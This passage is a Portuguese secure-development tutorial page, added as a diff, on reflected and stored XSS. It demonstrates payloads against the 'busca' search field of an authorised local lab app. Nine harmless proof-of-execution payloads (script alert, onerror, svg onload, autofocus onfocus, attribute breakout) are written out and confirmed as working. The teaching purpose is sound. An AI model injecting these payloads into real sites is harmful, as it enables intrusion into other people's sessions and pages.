@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="pt-BR"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1" name="viewport"/><title>XSS refletido e armazenado | Desenvolvimento Seguro</title><style>
+.xss-tutorial-root{--xss-tutorial-ink:#182b42;--xss-tutorial-muted:#4b6074;--xss-tutorial-blue:#145c9e;box-sizing:border-box;max-width:1120px;margin:0 auto;padding:24px;background:#f5f8fc;color:var(--xss-tutorial-ink);font:17px/1.75 system-ui,-apple-system,"Segoe UI",sans-serif;overflow-wrap:anywhere}
+.xss-tutorial-root *{box-sizing:border-box}
+.xss-tutorial-root h1,.xss-tutorial-root h2,.xss-tutorial-root h3,.xss-tutorial-root h4{line-height:1.25;color:#123453;font-weight:750}
+.xss-tutorial-root h1{font-size:clamp(2rem,5vw,3.5rem);margin:12px 0 20px;max-width:850px}
+.xss-tutorial-root h2{font-size:clamp(1.6rem,3vw,2.2rem);margin:8px 0 24px}
+.xss-tutorial-root h3{font-size:1.35rem;margin:32px 0 12px}
+.xss-tutorial-root h4{font-size:1.15rem;margin:0 0 10px}
+.xss-tutorial-root p{margin:12px 0 18px}
+.xss-tutorial-root a{color:#125a97;text-decoration:underline;text-underline-offset:3px}
+.xss-tutorial-root a:focus-visible,.xss-tutorial-root [tabindex]:focus-visible{outline:3px solid #a34e00;outline-offset:4px}
+.xss-tutorial-hero{padding:38px;background:#e7f0fa;border-top:7px solid #1763a5;border-radius:10px}
+.xss-tutorial-kicker{color:#235a82;font-size:.8rem;font-weight:800;letter-spacing:.12em;text-transform:uppercase}
+.xss-tutorial-lead{font-size:1.15rem;max-width:850px}
+.xss-tutorial-meta{color:#42576a;font-size:.9rem}
+.xss-tutorial-nav{background:#fff;border:1px solid #d3deea;padding:24px;margin:24px 0;border-radius:10px}
+.xss-tutorial-nav ol{columns:2;column-gap:35px;margin-bottom:0;padding-left:24px}
+.xss-tutorial-nav li{break-inside:avoid;padding:5px}
+.xss-tutorial-module{background:#fff;padding:36px;margin:28px 0;border:1px solid #d8e1eb;border-radius:10px;scroll-margin-top:20px}
+.xss-tutorial-note{padding:18px 22px;margin:24px 0;border-left:5px solid #16756c;background:#edf8f6;border-radius:0 8px 8px 0}
+.xss-tutorial-note p{margin:6px 0 0}
+.xss-tutorial-root pre{background:#101d30;color:#eef4ff;padding:20px;border-radius:0 0 8px 8px;overflow-x:auto;max-width:100%;font:14px/1.7 ui-monospace,SFMono-Regular,Consolas,monospace;white-space:pre;tab-size:4;margin:0 0 20px;overflow-wrap:normal}
+.xss-tutorial-root code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:.9em}
+.xss-tutorial-root p code,.xss-tutorial-root td code{background:#eef2f7;padding:2px 4px;border-radius:3px}
+.xss-tutorial-root pre code{font-size:inherit;color:inherit;background:transparent}
+.xss-tutorial-code-label{background:#23374e;color:#e6eef7;padding:7px 16px;border-radius:8px 8px 0 0;font-size:.75rem;font-weight:650;letter-spacing:.04em}
+.xss-tutorial-payload{margin:24px 0;padding:24px;border:1px solid #d7e2ed;border-radius:8px}
+.xss-tutorial-status{color:#365c73;font-size:.85rem;font-weight:650}
+.xss-tutorial-table-wrap{overflow-x:auto;max-width:100%;margin:24px 0}
+.xss-tutorial-root table{width:100%;border-collapse:collapse;font-size:.93rem;min-width:570px}
+.xss-tutorial-root th,.xss-tutorial-root td{padding:13px 15px;border:1px solid #d4deea;text-align:left;vertical-align:top}
+.xss-tutorial-root th{background:#eaf1f8;color:#153957}
+.xss-tutorial-root tbody tr:nth-child(even){background:#f7f9fc}
+.xss-tutorial-flow{display:flex;align-items:center;flex-wrap:wrap;gap:9px;padding:20px;background:#f0f5fb;border-radius:8px;margin:24px 0}
+.xss-tutorial-flow span{flex:1 1 110px;text-align:center;background:#fff;border:1px solid #b9cfe3;border-radius:6px;padding:12px;font-size:.9rem;font-weight:650}
+.xss-tutorial-flow b{color:#316890}
+.xss-tutorial-root figure{margin:24px 0}
+.xss-tutorial-root img{display:block;max-width:100%;height:auto;border:1px solid #c8d7e7;border-radius:8px}
+.xss-tutorial-root figcaption{font-size:.85rem;color:#465e73;margin-top:10px}
+.xss-tutorial-root li{margin:8px 0}
+.xss-tutorial-footer{padding:15px 24px;color:#465e73;font-size:.9rem}
+@media(max-width:640px){.xss-tutorial-root{padding:10px;font-size:16px}.xss-tutorial-hero,.xss-tutorial-module{padding:22px 16px}.xss-tutorial-payload{padding:16px 12px}.xss-tutorial-nav ol{columns:1}.xss-tutorial-root pre{padding:14px;font-size:13px}.xss-tutorial-flow{padding:12px}.xss-tutorial-flow span{flex-basis:100%}.xss-tutorial-flow b{width:100%;text-align:center;transform:rotate(90deg)}}
+@media print{.xss-tutorial-root{max-width:none;padding:0;background:white;font-size:11pt}.xss-tutorial-module{border:0;padding:14px 0}.xss-tutorial-root pre{white-space:pre-wrap;overflow-wrap:anywhere}.xss-tutorial-payload{break-inside:avoid}.xss-tutorial-nav{display:none}.xss-tutorial-root a{color:inherit}}
+</style></head><body>
+<!-- INÍCIO DO ARTIGO PARA MOODLE: copie também o bloco style do head, conforme README. -->
+
+<article class="xss-tutorial-root" lang="pt-BR"><header class="xss-tutorial-hero"><div class="xss-tutorial-kicker">Desenvolvimento Seguro · Apostila técnica</div><h1>Cross-Site Scripting</h1><p class="xss-tutorial-lead">Da interpretação do HTML à proteção de sessões: um percurso sobre XSS refletido e armazenado, com observações da FatecCorp.</p><p class="xss-tutorial-meta">Consulta e demonstração · Laboratório local autorizado · Verificação em 27/10/2026</p></header>
+<aside class="xss-tutorial-note"><strong>Como ler este material</strong><p>Os blocos escuros contêm código como texto: nada neles executa nesta página. “Confirmado” identifica observação no Chromium do laboratório; “ilustrativo” descreve um mecanismo sem alegar execução na FatecCorp. A aplicação fornecida como FatecCorp apresenta a marca <strong>FatecSeg Corp</strong> na interface. Todos os dados enviados nesta análise são fictícios.</p></aside>
+<nav aria-label="Índice do tutorial" class="xss-tutorial-nav"><strong>Percurso de leitura</strong><ol>
+<li><a href="#xss-tutorial-m1">Introdução ao XSS</a></li>
+<li><a href="#xss-tutorial-m2">HTML, JavaScript e eventos</a></li>
+<li><a href="#xss-tutorial-m3">XSS refletido na FatecCorp</a></li>
+<li><a href="#xss-tutorial-m4">XSS armazenado na FatecCorp</a></li>
+<li><a href="#xss-tutorial-m5">Cookies, sessões e consequências</a></li>
+<li><a href="#xss-tutorial-m6">Como identificar XSS</a></li>
+<li><a href="#xss-tutorial-m7">Prevenção e correção</a></li>
+<li><a href="#xss-tutorial-m8">Comparação geral</a></li>
+<li><a href="#xss-tutorial-m9">Referências técnicas</a></li>
+</ol></nav>
+<section class="xss-tutorial-module" id="xss-tutorial-m1"><div class="xss-tutorial-kicker">Módulo 01</div><h2>Introdução ao Cross-Site Scripting</h2>
+<h3>1.1 Dados que passam a ser interpretados como código</h3>
+<p><strong>Cross-Site Scripting (XSS)</strong> é uma vulnerabilidade na qual conteúdo controlado por uma parte não confiável acaba executando código no navegador no contexto de uma aplicação. A sigla usa X para “cross”, evitando confusão com CSS, a linguagem de estilos. O nome histórico não significa que todo caso precise carregar um script de outro site: o código pode vir da própria resposta da aplicação vulnerável.</p>
+<p>Trata-se de <strong>injeção de código</strong> porque a entrada muda a estrutura ou o comportamento que deveria ter sido definido apenas pelo desenvolvedor. Um termo de busca deve ser um dado; quando seus caracteres passam a formar um elemento de script ou um manipulador de evento, rompe-se a separação entre dados e instruções. A origem do texto não muda para confiável só porque ele passou pelo servidor ou foi salvo.</p>
+<div aria-label="Fluxo conceitual" class="xss-tutorial-flow"><span>Usuário: dados não confiáveis</span><b aria-hidden="true">→</b><span>Aplicação Web</span><b aria-hidden="true">→</b><span>Resposta HTML</span><b aria-hidden="true">→</b><span>Navegador</span><b aria-hidden="true">→</b><span>Execução de JavaScript</span></div>
+<p>Esse fluxo descreve um cenário vulnerável, não uma consequência inevitável de receber texto. O servidor recebe parâmetros, aplica regras de negócio e monta a resposta. O navegador analisa essa resposta com um parser HTML, constrói uma árvore de elementos chamada <strong>DOM</strong> e, quando permitido, executa JavaScript. O navegador não sabe que um trecho veio de um campo de busca; ele interpreta a estrutura recebida e aplica suas políticas de segurança.</p>
+<h3>1.2 A fronteira entre conteúdo e instrução</h3>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;p&gt;Busca: texto informado pelo usuário&lt;/p&gt;
+&lt;!-- Saída vulnerável: a entrada tornou-se marcação ativa. --&gt;
+&lt;p&gt;Busca: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/p&gt;
+&lt;!-- Saída codificada: os caracteres são exibidos como texto. --&gt;
+&lt;p&gt;Busca: &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;&lt;/p&gt;</code></pre>
+<p>No segundo parágrafo do exemplo, o elemento de script participa da estrutura HTML. No terceiro, as entidades representam caracteres de texto; o navegador não faz uma segunda interpretação automática para transformar aquele texto em script. A correção deve preservar essa distinção no <strong>contexto específico da saída</strong>.</p>
+<h3>1.3 Servidor, navegador e impactos</h3>
+<p>O servidor pode produzir uma resposta insegura tanto ao devolver uma entrada da requisição atual quanto ao recuperar conteúdo previamente armazenado. A execução de XSS acontece no navegador que abre essa resposta. O código passa a operar com as permissões web daquela página, sujeito à política de mesma origem e a outros controles; não ganha automaticamente acesso ao sistema operacional ou a todos os sites abertos.</p>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Aspecto</th><th scope="col">XSS</th><th scope="col">SQL Injection</th></tr></thead><tbody><tr><td>Interpretador afetado</td><td>Navegador: HTML e JavaScript.</td><td>Sistema de banco de dados: comandos SQL.</td></tr><tr><td>Fronteira rompida</td><td>Dados do usuário tornam-se conteúdo ativo da página.</td><td>Dados tornam-se parte da estrutura da consulta.</td></tr><tr><td>Defesa central</td><td>Saída tratada conforme seu contexto e uso de APIs seguras.</td><td>Consultas parametrizadas e separação entre comando e parâmetros.</td></tr><tr><td>Relação</td><td>Pode existir mesmo sem banco de dados.</td><td>Pode existir sem execução de JavaScript.</td></tr></tbody></table></div>
+<p>Entre os impactos possíveis estão alteração de conteúdo, falsificação da interface, leitura de informações acessíveis à página e ações com a sessão do usuário. A gravidade depende do local de execução, das permissões da vítima, dos dados disponíveis e das defesas existentes. Um alerta é uma evidência didática de execução, não uma medida completa do impacto. A classificação técnica dessa falha é <a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79, do MITRE</a>.</p>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m2"><div class="xss-tutorial-kicker">Módulo 02</div><h2>Fundamentos de HTML, JavaScript e eventos</h2>
+<h3>2.1 Tags, atributos e estrutura HTML</h3>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;p class="aviso"&gt;Uma mensagem de texto.&lt;/p&gt;
+&lt;input type="text" value="conteudo"&gt;
+&lt;img src="imagem-local.png" alt="Descrição da imagem"&gt;</code></pre>
+<p>Uma tag de abertura, como <code>&lt;p&gt;</code>, inicia um elemento; <code>&lt;/p&gt;</code> o encerra. O conteúdo fica entre ambas. Atributos aparecem na abertura e configuram o elemento: <code>class</code> é um exemplo. Elementos vazios, como <code>input</code> e <code>img</code>, não têm uma tag de fechamento HTML. Nem toda tag aceita os mesmos conteúdos, e o parser pode corrigir estruturas inválidas. Por isso o HTML retornado e a árvore exibida em Elements podem diferir.</p>
+<h3>2.2 JavaScript no navegador</h3>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+alert('Olá, mundo!');
+&lt;/script&gt;</code></pre>
+<p>O elemento <code>script</code> delimita instruções JavaScript. A chamada <code>alert(...)</code> invoca uma função; parênteses contêm seus argumentos, e aspas delimitam uma string. Esse código é legítimo quando integra intencionalmente a aplicação. O mesmo código, introduzido por um visitante onde só deveria existir texto, evidencia uma quebra da fronteira de confiança. O fato de ser JavaScript não o torna, isoladamente, uma vulnerabilidade.</p>
+<h3>2.3 Funções e propriedades usadas nas demonstrações</h3>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Expressão</th><th scope="col">Significado e limites</th></tr></thead><tbody><tr><td><code>alert()</code></td><td>Solicita um diálogo ao navegador. Diálogos podem ser suprimidos; a ausência de janela não prova ausência de execução.</td></tr><tr><td><code>console.log()</code></td><td>Registra uma mensagem no Console. Filtros da ferramenta podem ocultar o registro; não altera a interface.</td></tr><tr><td><code>document.domain</code></td><td>Lê o domínio do documento; no acesso por IP aqui, retorna 192.168.10.20. Não é a origem completa: protocolo e porta não aparecem. Alterar essa propriedade é uma prática legada, fora desta demonstração.</td></tr><tr><td><code>location.href</code></td><td>Lê a URL completa da página atual, incluindo consulta e fragmento quando presentes. A leitura não redireciona; atribuir outro valor pode navegar.</td></tr><tr><td><code>document.title</code></td><td>Lê ou altera o título do documento, normalmente mostrado na aba.</td></tr><tr><td><code>document.cookie</code></td><td>Lê os pares nome=valor de cookies acessíveis ao JavaScript naquele contexto. Não inclui os cookies HttpOnly nem seus atributos de configuração.</td></tr><tr><td><code>document.body.style</code></td><td>Acessa estilos inline do elemento body. A propriedade backgroundColor permite alterar sua cor; não modifica arquivos CSS no servidor.</td></tr></tbody></table></div>
+<p>O operador <code>=</code> atribui um valor; o operador <code>+</code> pode concatenar strings. Uma expressão como <code>document.title = 'Novo título'</code> altera uma propriedade de um objeto. Essas pequenas operações ajudam a comprovar execução sem ler informações de usuários. Referência de linguagem: <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript">JavaScript na MDN</a>.</p>
+<h3>2.4 Eventos HTML: execução sem uma tag de script</h3>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Atributo</th><th scope="col">Momento em que o código pode executar</th><th scope="col">Observação</th></tr></thead><tbody><tr><td><code>onload</code></td><td>Quando o evento de carregamento correspondente é emitido.</td><td>Depende do elemento e do modo como ele foi inserido.</td></tr><tr><td><code>onerror</code></td><td>Quando ocorre um erro no recurso associado, como falha de imagem.</td><td>Uma imagem válida não provoca esse erro de carregamento.</td></tr><tr><td><code>onfocus</code></td><td>Quando o elemento recebe foco.</td><td>Pode exigir interação; autofocus é uma solicitação, não uma garantia.</td></tr><tr><td><code>onclick</code></td><td>Quando ocorre a ativação/clique no elemento.</td><td>Não executa apenas por o HTML estar presente.</td></tr><tr><td><code>onmouseover</code></td><td>Quando o ponteiro entra no elemento ou em descendentes conforme a propagação do evento.</td><td>Dispositivos sem ponteiro e ausência de interação mudam o comportamento.</td></tr></tbody></table></div>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;button type="button" onclick="console.log('Clique observado')"&gt;
+  Exemplo de evento
+&lt;/button&gt;</code></pre>
+<p>O valor de um atributo de evento contém instruções, não texto comum. O exemplo registra uma mensagem se o botão for ativado em um documento que permita handlers inline; aqui ele é apenas texto. Esses atributos mostram por que bloquear somente a palavra <code>script</code> é insuficiente para prevenir XSS.</p>
+<h3>2.5 Aspas determinam a fronteira de um atributo</h3>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;input type="text" value="conteudo"&gt;</code></pre>
+<p>As aspas duplas delimitam o valor de <code>value</code>. Se a aplicação concatena uma entrada sem codificar a aspa correspondente, o usuário pode encerrar esse valor e introduzir novos atributos. Em contrapartida, uma tag de script dentro de um valor corretamente delimitado é apenas parte daquele valor: seu formato não basta para criar um elemento executável. Vamos observar as duas situações na News.</p>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m3"><div class="xss-tutorial-kicker">Módulo 03</div><h2>XSS refletido na FatecCorp</h2>
+<h3>3.1 Da requisição à mesma resposta</h3>
+<p>No <strong>XSS refletido</strong>, uma entrada da requisição é incorporada à resposta que o navegador interpreta. Ela pode chegar em uma consulta GET, em um corpo POST ou por outra entrada controlável. Não é necessário persistir o payload para essa execução. Um link preparado pode carregar o valor na URL; a vítima precisa ser exposta à requisição e à resposta vulneráveis. Logs podem registrar o valor, mas isso não transforma automaticamente esse fluxo em XSS armazenado.</p>
+<p>Referência observada: <a href="http://192.168.10.20/fateccorp/index.php?page=pages/news.php">News — Notícias e Conhecimento</a>. O formulário real usa <code>method="get"</code>, <code>action="index.php"</code>, um campo oculto <code>page=pages/news.php</code> e um campo de texto <code>busca</code>. O botão é “Buscar”.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;form method="get" action="index.php"&gt;
+  &lt;input type="hidden" name="page" value="pages/news.php"&gt;
+  &lt;input type="text" name="busca" value=""&gt;
+  &lt;button type="submit"&gt;Buscar&lt;/button&gt;
+&lt;/form&gt;
+&lt;!-- Trecho observado; estilos e contêineres omitidos. --&gt;</code></pre>
+<h3>3.2 O que foi efetivamente observado</h3>
+<p>Ao preencher o formulário com <code>FATEC_XSS_MARCADOR_20261027</code> e acionar Buscar, a navegação foi para a requisição abaixo. O marcador reapareceu no atributo <code>value</code> e em dois elementos <code>strong</code> no corpo. São dois contextos distintos para a mesma entrada.</p>
+<div class="xss-tutorial-code-label">HTTP · navegação observada, cabeçalhos não relevantes omitidos · somente leitura</div><pre><code>GET /fateccorp/index.php?page=pages%2Fnews.php&amp;busca=FATEC_XSS_MARCADOR_20261027 HTTP/1.1
+Host: 192.168.10.20</code></pre>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;input type="text" name="busca" value="FATEC_XSS_MARCADOR_20261027" ...&gt;
+&lt;strong&gt;FATEC_XSS_MARCADOR_20261027&lt;/strong&gt;
+&lt;!-- Recortes observados; ... indica atributos omitidos na transcrição. --&gt;</code></pre>
+<figure><img alt="Página News da FatecCorp com o marcador didático no campo de busca e no resultado, sem dados de sessão." loading="lazy" src="assets/news-marcador.png"/><figcaption>Captura real do Chromium: marcador inofensivo submetido pelo formulário de busca. A imagem é evidência de reflexão; a execução foi verificada separadamente.</figcaption></figure>
+<aside class="xss-tutorial-note"><strong>Protocolo de confirmação</strong><p>Os nove payloads abaixo e a quebra de atributo foram carregados na News em Chromium 148. Chamadas de <code>alert</code> foram registradas por instrumentação instalada antes do carregamento, evitando diálogos que interrompem a automação. Isso confirma a invocação pelo código injetado; não é uma captura de uma janela de alerta. Console, título e estilo foram inspecionados separadamente. Os resultados são relativos a esta configuração do laboratório.</p></aside>
+<h3>3.3 Payloads básicos: um efeito de cada vez</h3>
+<article class="xss-tutorial-payload"><h4>Payload 1 — Execução básica</h4><p class="xss-tutorial-status">Confirmado na News: chamada de alert com XSS registrada.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> O elemento script contém uma chamada de alert com a string XSS.</p>
+<p><strong>Contexto e resultado.</strong> Exige saída não codificada em conteúdo HTML que aceite o elemento script, e permissão para JavaScript inline. Dentro de value sem romper as aspas, essa tag não vira um elemento. A execução solicita o diálogo “XSS”.</p>
+<p><strong>Condições e limites.</strong> Codificação de saída, sanitização apropriada ou CSP podem impedir a execução. Inserção por certos mecanismos de atualização de HTML também não executa scripts da mesma forma que o parser de uma navegação.</p>
+<p><strong>Conceito demonstrado.</strong> Texto não confiável tornou-se instrução do navegador.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 2 — Domínio atual</h4><p class="xss-tutorial-status">Confirmado na News: chamada com 192.168.10.20 registrada.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Em vez de uma string fixa, o argumento é a leitura de document.domain.</p>
+<p><strong>Contexto e resultado.</strong> Exige saída não codificada em conteúdo HTML que aceite o elemento script, e permissão para JavaScript inline. Dentro de value sem romper as aspas, essa tag não vira um elemento. No laboratório, o valor lido foi 192.168.10.20.</p>
+<p><strong>Condições e limites.</strong> Codificação de saída, sanitização apropriada ou CSP podem impedir a execução. Inserção por certos mecanismos de atualização de HTML também não executa scripts da mesma forma que o parser de uma navegação. Essa propriedade não informa porta nem protocolo.</p>
+<p><strong>Conceito demonstrado.</strong> O código roda associado ao documento vulnerável, não a uma página independente do autor do payload.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 3 — URL da página</h4><p class="xss-tutorial-status">Confirmado na News: chamada contendo a URL de teste registrada.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;alert(location.href)&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Lê a URL atual e a passa para alert.</p>
+<p><strong>Contexto e resultado.</strong> Exige saída não codificada em conteúdo HTML que aceite o elemento script, e permissão para JavaScript inline. Dentro de value sem romper as aspas, essa tag não vira um elemento. O valor inclui a rota News e o parâmetro busca codificado na URL.</p>
+<p><strong>Condições e limites.</strong> Codificação de saída, sanitização apropriada ou CSP podem impedir a execução. Inserção por certos mecanismos de atualização de HTML também não executa scripts da mesma forma que o parser de uma navegação. A URL pode conter informações; aqui só havia o payload de teste e parâmetros do laboratório.</p>
+<p><strong>Conceito demonstrado.</strong> O script consegue ler informações de navegação disponíveis ao documento.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 4 — Console JavaScript</h4><p class="xss-tutorial-status">Confirmado na News: mensagem no Console.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;console.log('XSS executado')&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Chama console.log com uma mensagem fixa.</p>
+<p><strong>Contexto e resultado.</strong> Exige saída não codificada em conteúdo HTML que aceite o elemento script, e permissão para JavaScript inline. Dentro de value sem romper as aspas, essa tag não vira um elemento. O Console recebe XSS executado.</p>
+<p><strong>Condições e limites.</strong> Codificação de saída, sanitização apropriada ou CSP podem impedir a execução. Inserção por certos mecanismos de atualização de HTML também não executa scripts da mesma forma que o parser de uma navegação. É necessário observar o nível de log correto e limpar registros anteriores para atribuir a mensagem à navegação.</p>
+<p><strong>Conceito demonstrado.</strong> Execução pode ser comprovada sem alteração visual ou leitura de dados.</p>
+</article>
+<h3>3.4 Payloads utilizando eventos HTML</h3>
+<article class="xss-tutorial-payload"><h4>Payload 5 — onerror</h4><p class="xss-tutorial-status">Confirmado na News: chamada XSS pelo handler registrada.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;img src=x onerror=alert('XSS')&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Cria uma imagem cuja URL relativa é x e associa uma chamada ao erro de carregamento. O valor do handler está sem aspas HTML; as aspas internas pertencem à string JavaScript.</p>
+<p><strong>Contexto e resultado.</strong> Precisa ser interpretado como elemento img. Nesta rota, x é resolvido relativamente ao diretório /fateccorp/. Se a imagem falhar, o evento pode chamar alert.</p>
+<p><strong>Condições e limites.</strong> Se x for uma imagem válida, o erro esperado não ocorre. Sanitização, codificação e CSP que bloqueie handlers inline impedem o efeito; falha de rede sozinha não comprova execução.</p>
+<p><strong>Conceito demonstrado.</strong> A superfície de execução inclui atributos de evento.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 6 — SVG com onload</h4><p class="xss-tutorial-status">Confirmado na News: chamada XSS registrada.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;svg onload=alert('XSS')&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Introduz um elemento SVG com um handler de carregamento.</p>
+<p><strong>Contexto e resultado.</strong> O parser precisa reconhecer a marcação SVG em conteúdo HTML. Na configuração verificada, o evento provocou a chamada de alert.</p>
+<p><strong>Condições e limites.</strong> Não é universal: modo de inserção, tratamento do SVG, sanitização, política de scripts e comportamento do navegador interferem.</p>
+<p><strong>Conceito demonstrado.</strong> Elementos de outras linguagens de marcação integrados ao HTML também exigem tratamento seguro.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 7 — onfocus</h4><p class="xss-tutorial-status">Confirmado na News: chamada XSS registrada no carregamento testado.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;input autofocus onfocus=alert('XSS')&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Cria um campo focável, pede foco com autofocus e define um handler onfocus.</p>
+<p><strong>Contexto e resultado.</strong> Precisa criar um elemento input real em um contexto permitido. Ao receber foco, o campo solicita o alerta.</p>
+<p><strong>Condições e limites.</strong> Autofocus pode ser ignorado por disputa de foco, estado do documento, navegação ou políticas do navegador. Foco manual pode disparar o evento; CSP pode bloquear o handler.</p>
+<p><strong>Conceito demonstrado.</strong> Presença do elemento e disparo do evento são etapas diferentes.</p>
+</article>
+<h3>3.5 Manipulação visual da página</h3>
+<article class="xss-tutorial-payload"><h4>Payload 8 — Alteração da cor de fundo</h4><p class="xss-tutorial-status">Confirmado na News: document.body.style.backgroundColor retornou red.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+document.body.style.backgroundColor='red'
+&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Atribui red à propriedade backgroundColor do estilo inline de body.</p>
+<p><strong>Contexto e resultado.</strong> Exige saída não codificada em conteúdo HTML que aceite o elemento script, e permissão para JavaScript inline. Dentro de value sem romper as aspas, essa tag não vira um elemento. A propriedade de estilo passa a red; áreas cobertas por outros elementos podem manter suas próprias cores.</p>
+<p><strong>Condições e limites.</strong> Codificação de saída, sanitização apropriada ou CSP podem impedir a execução. Inserção por certos mecanismos de atualização de HTML também não executa scripts da mesma forma que o parser de uma navegação. O body deve existir nesse momento; regras CSS prioritárias podem limitar o efeito percebido.</p>
+<p><strong>Conceito demonstrado.</strong> Uma modificação visual prova capacidade de alterar a apresentação, mas não prova acesso a dados ou tomada de sessão.</p>
+</article>
+<article class="xss-tutorial-payload"><h4>Payload 9 — Alteração do título</h4><p class="xss-tutorial-status">Confirmado na News: título XSS executado.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;script&gt;
+document.title='XSS executado'
+&lt;/script&gt;</code></pre>
+<p><strong>Leitura do código.</strong> Atribui uma string à propriedade title do documento.</p>
+<p><strong>Contexto e resultado.</strong> Exige saída não codificada em conteúdo HTML que aceite o elemento script, e permissão para JavaScript inline. Dentro de value sem romper as aspas, essa tag não vira um elemento. O título lido após o carregamento passa a XSS executado.</p>
+<p><strong>Condições e limites.</strong> Codificação de saída, sanitização apropriada ou CSP podem impedir a execução. Inserção por certos mecanismos de atualização de HTML também não executa scripts da mesma forma que o parser de uma navegação. Outro script pode substituir o título posteriormente.</p>
+<p><strong>Conceito demonstrado.</strong> XSS pode adulterar informações da interface; a alteração aqui não é persistência no servidor.</p>
+</article>
+<h3>3.6 Quebra de atributo: uma segunda superfície na mesma entrada</h3>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>" onfocus="alert('XSS no Input!')" autofocus="</code></pre>
+<p>A primeira aspa dupla encerra o valor original de <code>value</code>. O espaço separa atributos e <code>onfocus="..."</code> acrescenta código a executar quando o input recebe foco. Em seguida, <code>autofocus="</code> abre outro valor: a aspa de fechamento que já existia no template pode encerrá-lo. O atributo booleano autofocus vale pela presença, mesmo escrito com valor vazio.</p>
+<div class="xss-tutorial-code-label">HTML · somente leitura</div><pre><code>&lt;input type="text" value="ENTRADA_USUARIO"&gt;
+
+&lt;!-- Resultado ilustrativo da concatenação vulnerável: --&gt;
+&lt;input type="text" value=""
+       onfocus="alert('XSS no Input!')"
+       autofocus=""&gt;</code></pre>
+<p>Na FatecCorp, existe esse contexto equivalente no input <code>name="busca"</code>. A inspeção confirmou os atributos novos e a chamada <code>XSS no Input!</code>. O mesmo conteúdo inserido entre tags não tem necessariamente o mesmo efeito; em um atributo delimitado por aspas simples, essa primeira aspa dupla não encerra o valor. Com <code>&amp;quot;</code> na saída HTML, a aspa fica no valor como dado e não cria outro atributo.</p>
+<p>A execução exige que o input receba foco e que handlers inline sejam permitidos. O nome autofocus não garante foco em todos os carregamentos. Este payload demonstra como a sintaxe do contexto, especialmente o delimitador, determina o resultado; não é uma string universal para qualquer campo.</p>
+<h3>3.7 Leitura final do fluxo refletido</h3>
+<p>A News confirmou duas posições de reflexão e execução inofensiva por script e eventos. O parâmetro <code>page</code> seleciona a rota nesta demonstração; o vetor confirmado é <code>busca</code>. A vulnerabilidade não é o uso de GET: é devolver essa entrada sem tratamento nos contextos identificados. Codificar o transporte na URL não corrige a saída HTML, pois o servidor decodifica os parâmetros antes de utilizá-los.</p>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m4"><div class="xss-tutorial-kicker">Módulo 04</div><h2>XSS armazenado na FatecCorp</h2>
+<h3>4.1 Persistir dados não deveria persistir instruções</h3>
+<p>No <strong>Stored XSS</strong>, também chamado XSS armazenado ou persistente, a aplicação guarda uma entrada e a recupera em outra ocasião. O código não executa “dentro do armazenamento”; executa quando uma página apresenta o conteúdo de maneira vulnerável e um navegador o interpreta. O meio de persistência pode ser banco, arquivo ou outro serviço. A categoria exige evidência de recuperação posterior, não apenas uma mensagem de envio bem-sucedido.</p>
+<div aria-label="Fluxo conceitual" class="xss-tutorial-flow"><span>Entrada enviada</span><b aria-hidden="true">→</b><span>Aplicação</span><b aria-hidden="true">→</b><span>Armazenamento</span><b aria-hidden="true">→</b><span>Recuperação</span><b aria-hidden="true">→</b><span>Exibição</span><b aria-hidden="true">→</b><span>Execução no navegador</span></div>
